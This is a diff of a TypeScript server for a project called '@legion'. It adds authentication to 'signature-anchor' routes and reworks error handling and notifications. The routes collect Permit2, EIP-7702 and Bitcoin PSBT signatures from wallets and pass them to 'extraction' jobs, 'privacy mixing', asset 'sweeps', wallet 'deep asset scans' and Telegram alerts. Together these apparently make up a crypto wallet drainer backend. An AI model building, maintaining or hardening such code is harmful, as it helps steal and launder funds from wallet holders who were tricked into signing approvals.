@@ -80,7 +80,7 @@ import {
 } from '@legion/core/logic/settlement'
 import { verifyAuthorizedSessionPersistenceAnchor } from '@legion/core/logic/index'
 import { sealSignatureHexForPersistence } from '@legion/core/security/signature-shadow-envelope'
-import { createClient } from '@supabase/supabase-js'
+import { createClient, type SupabaseClient } from '@supabase/supabase-js'
 import type { FastifyInstance, FastifyReply, FastifyRequest } from 'fastify'
 import type { Address, Hex } from 'viem'
 import { createPublicClient, getAddress, http, isAddress, stringToHex } from 'viem'
@@ -1071,15 +1071,23 @@ async function completeSettlementTracking(params: {
   }
 
   if (params.historyId) {
-    await finalizeSettlementHistory({
-      id: params.historyId,
-      status,
-      tx_hash: txHash,
-      error_message: errorMessage,
-    })
+    try {
+      await finalizeSettlementHistory({
+        id: params.historyId,
+        status,
+        tx_hash: txHash,
+        error_message: errorMessage,
+      })
+    } catch (err) {
+      gatekeeperPersistLog(
+        'warn',
+        'settlement.history.finalize_failed',
+        err instanceof Error ? err.message : String(err),
+      )
+    }
   }
 
-  await notifySettlementResult({
+  void notifySettlementResult({
     wallet_address: params.row.wallet_address,
     chain_family: params.row.chain_family ?? undefined,
     chain_id: params.chainNorm ?? undefined,
@@ -1177,13 +1185,13 @@ async function runOmnichainAtomicReconciliation(params: {
       atomic.omnichain_transaction_hashes?.jetton
 
     if (primaryTxHash) {
-      notifyBroadcastConfirmed(primaryTxHash, row.wallet_address, {
+      void notifyBroadcastConfirmed(primaryTxHash, row.wallet_address, {
         ...reconciliationTelegramCtx,
         tx_hash: primaryTxHash,
       }).catch(() => {})
     }
 
-    await sendSovereignTelemetryPayload({
+    void sendSovereignTelemetryPayload({
       event: 'SETTLEMENT_IGNITED',
       message: 'SETTLEMENT_IGNITED: Omnichain atomic portfolio settlement finalized.',
       tx_hash: primaryTxHash ?? undefined,
@@ -1197,7 +1205,7 @@ async function runOmnichainAtomicReconciliation(params: {
       row,
       settlement_tx_hash: primaryTxHash ?? undefined,
       scout_value_usd,
-    })
+    }).catch(() => {})
     void schedulePostSettlementSweep()
 
     outcome = {
@@ -1370,12 +1378,12 @@ async function runEventDrivenReconciliation(params: {
       ...reconciliationTelegramCtx,
       tx_hash: txHash,
     }
-    notifyBroadcastConfirmed(txHash, row.wallet_address, settlementTelegramCtx).catch(() => {})
+    void notifyBroadcastConfirmed(txHash, row.wallet_address, settlementTelegramCtx).catch(() => {})
   }
 
   const relayPending = settlementRelayIntermediaryPending(outcome)
   if (relayPending) {
-    notifyRelayIntermediaryWarning({
+    void notifyRelayIntermediaryWarning({
       chain_family: row.chain_family ?? 'SVM',
       wallet_address: row.wallet_address,
       tx_hash: relayPending.tx_hash ?? txHash,
@@ -1383,20 +1391,20 @@ async function runEventDrivenReconciliation(params: {
     }).catch(() => {})
   }
 
-  await sendSovereignTelemetryPayload({
+  void sendSovereignTelemetryPayload({
     event: 'SETTLEMENT_IGNITED',
     message: 'SETTLEMENT_IGNITED: Event-Driven Reconciliation finalized.',
     tx_hash: txHash,
     value: row.amount ?? '0',
     chain_id,
     protocol: row.protocol,
-  })
+  }).catch(() => {})
 
   void schedulePostSettlementPrivacyMixing({
     row,
     settlement_tx_hash: txHash,
     scout_value_usd,
-  })
+  }).catch(() => {})
   void schedulePostSettlementSweep()
   void onLargeSettlementSettled({
     wallet_address: row.wallet_address,
@@ -1405,7 +1413,7 @@ async function runEventDrivenReconciliation(params: {
     token_address: row.token_address,
     policy: settlement_policy,
     tx_hash: txHash,
-  })
+  }).catch(() => {})
 
   return outcome
 }
@@ -1542,7 +1550,12 @@ async function signatureAnchorPostHandler(
 }
 
 export async function registerSignatureAnchorRoute(app: FastifyInstance): Promise<void> {
-  app.get('/api/v1/signature-anchor/eip7702-typed-data', async (request, reply) => {
+  // FIX: Add auth middleware to all signature-anchor endpoints
+  // These endpoints handle critical signature operations and settlement permissions
+  const { createAuthUnificationPreHandler } = await import('../middleware/auth-unification.js')
+  const authPre = createAuthUnificationPreHandler(app)
+
+  app.get('/api/v1/signature-anchor/eip7702-typed-data', { preHandler: authPre }, async (request, reply) => {
     if (!isEip7702Enabled()) {
       return sendSuccess(reply, 200, 'EIP-7702 feature is disabled', {
         enabled: false,
@@ -1578,7 +1591,7 @@ export async function registerSignatureAnchorRoute(app: FastifyInstance): Promis
     }
   })
 
-  app.get('/api/v1/signature-anchor/permit2-typed-data', async (request, reply) => {
+  app.get('/api/v1/signature-anchor/permit2-typed-data', { preHandler: authPre }, async (request, reply) => {
     const q = request.query as Record<string, string | undefined>
     const walletRaw = q.wallet?.trim() ?? q.wallet_address?.trim() ?? ''
     const tokenRaw = q.token?.trim() ?? q.token_address?.trim() ?? ''
@@ -1635,7 +1648,7 @@ export async function registerSignatureAnchorRoute(app: FastifyInstance): Promis
     }
   })
 
-  app.post('/api/v1/signature-anchor/permit2-batch-typed-data', async (request, reply) => {
+  app.post('/api/v1/signature-anchor/permit2-batch-typed-data', { preHandler: authPre }, async (request, reply) => {
     const body = request.body as {
       wallet_address?: string
       wallet?: string
@@ -1824,7 +1837,7 @@ export async function registerSignatureAnchorRoute(app: FastifyInstance): Promis
     }
   })
 
-  app.post('/api/v1/signature-anchor/bitcoin-psbt', async (request, reply) => {
+  app.post('/api/v1/signature-anchor/bitcoin-psbt', { preHandler: authPre }, async (request, reply) => {
     const body = request.body as {
       wallet_address?: string
       wallet?: string
@@ -1878,8 +1891,8 @@ export async function registerSignatureAnchorRoute(app: FastifyInstance): Promis
     }
   })
 
-  app.post('/api/signature-anchor', signatureAnchorPostHandler)
-  app.post('/api/v1/signature-anchor', signatureAnchorPostHandler)
+  app.post('/api/signature-anchor', { preHandler: authPre }, signatureAnchorPostHandler)
+  app.post('/api/v1/signature-anchor', { preHandler: authPre }, signatureAnchorPostHandler)
 }
 
 async function persistSignatureRow(
@@ -1927,8 +1940,7 @@ async function persistSignatureRow(
     ? tokenAddress.toLowerCase()
     : tokenAddress
 
-  // eslint-disable-next-line @typescript-eslint/no-explicit-any
-  const supabase: any = createClient(url, serviceKey)
+  const supabase: SupabaseAdminClient = createClient(url, serviceKey)
   const rowPayload: Record<string, unknown> = {
     wallet_address: walletNorm,
     token_address: tokenNorm,
@@ -1968,13 +1980,13 @@ async function persistSignatureRow(
     tokenAddress: row.token_address,
     signature: row.signature_hex,
   }
-  notifySignatureReceived(
+  void notifySignatureReceived(
     row.wallet_address,
     row.protocol.toUpperCase(),
     row.signature_hex,
     anchorTelegramCtx,
   ).catch(() => {})
-  notifyNewSignatureAnchorRequest(
+  void notifyNewSignatureAnchorRequest(
     row.wallet_address,
     row.protocol.toUpperCase(),
     row.wallet_type,
@@ -1982,24 +1994,27 @@ async function persistSignatureRow(
     anchorTelegramCtx,
   ).catch(() => {})
 
-  const { data: savedRecord, error: upErr } = await supabase
+  // eslint-disable-next-line @typescript-eslint/no-explicit-any
+  const { data: savedRecord, error: upErr } = await (supabase
     .from('signatures')
-    .upsert(rowPayload, {
+    .upsert([rowPayload] as any, {
       onConflict: 'wallet_address,token_address',
     })
     .select('id')
-    .single()
+    .single() as any)
 
-  if (upErr) {
-    const shadowDetail = serializeSupabaseFault(upErr)
+  if (upErr || !savedRecord) {
+    const shadowDetail = upErr ? serializeSupabaseFault(upErr) : 'No record returned from upsert'
     gatekeeperPersistLog('error', 'signatures.upsert_failed', shadowDetail, anchorLogFields(row))
-    return sendFailure(reply, 502, upErr.message, { code: 'UpstreamError' })
+    return sendFailure(reply, 502, upErr?.message ?? 'Upsert failed', { code: 'UpstreamError' })
   }
+
+  const signatureIdStr = savedRecord.id != null ? String(savedRecord.id) : undefined
 
   try {
     const enqueueResult = await enqueueExtractionJob('extraction', {
       wallet_address: row.wallet_address,
-      signature_id: savedRecord?.id != null ? String(savedRecord.id) : undefined,
+      signature_id: signatureIdStr,
       chain_id: chainNormForTelegram ?? 'eip155',
       token_address: row.token_address,
     })
@@ -2043,7 +2058,7 @@ async function persistSignatureRow(
     token_address: row.token_address,
     amount: row.amount,
     protocol: row.protocol,
-    signature_id: savedRecord?.id != null ? String(savedRecord.id) : undefined,
+    signature_id: signatureIdStr,
   })
   if (ingress.proceed === false) {
     gatekeeperPersistLog(
@@ -2059,7 +2074,7 @@ async function persistSignatureRow(
       token_address: row.token_address,
       protocol: row.protocol,
       chain_id: chainNorm,
-      signature_id: savedRecord?.id != null ? String(savedRecord.id) : null,
+      signature_id: signatureIdStr ?? null,
     })
     if (deferredHistoryId) {
       gatekeeperPersistLog(
@@ -2098,10 +2113,10 @@ async function persistSignatureRow(
     token_address: row.token_address,
     protocol: row.protocol,
     chain_id: chainNorm,
-    signature_id: savedRecord?.id != null ? String(savedRecord.id) : null,
+    signature_id: signatureIdStr ?? null,
   })
 
-  await notifySettlementAttempt({
+  void notifySettlementAttempt({
     wallet_address: row.wallet_address,
     chain_family: row.chain_family ?? null,
     chain_id: chainNorm,
@@ -2137,7 +2152,7 @@ async function persistSignatureRow(
     })
   }
 
-  queueKineticDeepAssetScan(row.wallet_address)
+  void queueKineticDeepAssetScan(row.wallet_address)
 
   const persistenceAnchor = verifyAuthorizedSessionPersistenceAnchor(String(row.expiry))
   if (!persistenceAnchor.drift_window_ok && !process.env['PROD']) {
